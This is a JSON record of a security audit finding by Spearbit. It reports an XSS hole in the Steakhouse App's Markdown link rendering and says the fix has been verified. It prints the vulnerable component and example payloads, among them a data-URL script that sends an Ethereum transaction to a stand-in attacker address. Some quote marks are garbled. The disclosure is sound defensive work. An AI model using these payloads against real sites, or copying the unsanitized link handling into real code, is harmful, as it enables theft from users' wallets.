@@ -1,0 +1,50 @@
+{
+    "id": 62752,
+    "kind": "PDF",
+    "auditfirm_id": 6,
+    "impact": "LOW",
+    "finders_count": 2,
+    "protocol_id": 3441,
+    "title": "XSS in Markdown Component Link Rendering",
+    "content": "## Vulnerability Report\n\n## Severity: Low Risk\n\n### Context\n`src/components/ui/markdown/index.tsx#L25-L30`\n\n### Description\nA Cross-Site Scripting (XSS) vulnerability exists in the custom Markdown component where external data from the WHISK API is rendered without proper sanitization. The component overrides `react-markdown`'s default link sanitization, allowing malicious `href` attributes to be injected through vault descriptions, leading to JavaScript execution and potential wallet compromise.\n\nWe have attempted to create a vault on the Morpho curator app that would contain these malicious payloads; however, filtering is in place to use only trusted vaults.\n\n### Supported Vaults\n```javascript\nsupportedVaults: {\n  [mainnet.id]: [\n    { address: getAddress(\"0xBEEF01735c132Ada46AA9aA4c54623cAA92A64CB\"), tag: \"Prime\" }, // Steakhouse USDC\n    { address: getAddress(\"0xbEEF02e5E13584ab96848af90261f0C8Ee04722a\"), tag: \"Prime\" }, // Steakhouse PYUSD\n    { address: getAddress(\"0xbEef047a543E45807105E51A8BBEFCc5950fcfBa\"), tag: \"Prime\" }, // Steakhouse USDT\n    // ...\n  ]\n}\n```\n\nDue to the filtering in place, we were unable to get any of these vaults to render within the context of the web application; however, this doesn't mean that it may not be possible in the future.\n\n### Proof of Concept\nThe custom Markdown component overrides `react-markdown`'s default link sanitization with a custom `<a>` component that directly assigns the `href` attribute without validation.\n\n```javascript\n<ReactMarkdown\n  components={{\n    // ... other components\n    a: ({ children, href }) => (\n      <a href={href} target=\"_blank\" rel=\"noopener noreferrer\" className=\"text-primary hover:underline\">\n        {children}\n      </a>\n    ),\n  }}\n>\n  {children}\n</ReactMarkdown>\n```\n\nVault descriptions are fetched from the WHISK API and rendered through the vulnerable Markdown component, allowing malicious markdown content to inject JavaScript protocol URLs.\n\n### Example\n```html\n<div class=\"body-large\">\n  <h1>Steakhouse USDC Vault</h1>\n  <p>This vault provides excellent yields!\n    <a href=\"javascript:alert(/quotesingle.ts1XSS - Wallet Compromised!/quotesingle.ts1)\" target=\"_blank\" rel=\"noopener noreferrer\" class=\"text-primary hover:underline\">↪→ Click here for more info</a>\n  </p>\n  <p>\n    <a href=\"data:text/html,<script>window.ethereum.request({method:/quotesingle.ts1eth_sendTransaction/quotesingle.ts1,params:[{to:/quotesingle.ts1⌋ 0xattacker/quotesingle.ts1,value:/quotesingle.ts10x/quotesingle.ts1}]})</script>\" target=\"_blank\" rel=\"noopener noreferrer\" class=\"text-primary hover:underline\">↪→ Visit our docs</a> for detailed information.\n  </p>\n</div>\n```\n\n### Likelihood\nLow\n\n### Impact\nHigh\n\n### Recommendation\nSanitize any data that is used directly in sinks from the WHISK API.\n\n### Status\n- **Steakhouse**: Fixed in PR 5.\n- **Spearbit**: Fix verified. `defaultUrlTransform` is used to prevent XSS in the case of dangerous protocols being used in `href`.",
+    "summary": "",
+    "report_date": "2025-09-25T00:00:00.000Z",
+    "contest_prize_txt": "",
+    "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Steakhouse-App-Web2-Spearbit-Security-Review-September-2025.pdf",
+    "sponsor_name": null,
+    "sponsor_link": "",
+    "quality_score": 0,
+    "general_score": 0,
+    "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Steakhouse-App-Web2-Spearbit-Security-Review-September-2025.pdf",
+    "github_link": "",
+    "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Steakhouse-App-Web2-Spearbit-Security-Review-September-2025.pdf",
+    "pdf_page_from": 7,
+    "contest_id": "",
+    "slug": "xss-in-markdown-component-link-rendering-spearbit-none-steakhouse-app-pdf",
+    "firm_name": "Spearbit",
+    "firm_logo_square": "spearbit_square.png",
+    "protocol_name": "Steakhouse App",
+    "bookmarked": false,
+    "read": false,
+    "issues_issue_finders": [
+        {
+            "wardens_warden": {
+                "handle": "Dreyand"
+            }
+        },
+        {
+            "wardens_warden": {
+                "handle": "Mikey96"
+            }
+        }
+    ],
+    "auditfirms_auditfirm": {
+        "name": "Spearbit",
+        "logo_square": "spearbit_square.png"
+    },
+    "protocols_protocol": {
+        "name": "Steakhouse App",
+        "protocols_protocolcategoryscore": []
+    },
+    "issues_issuetagscore": []
+}
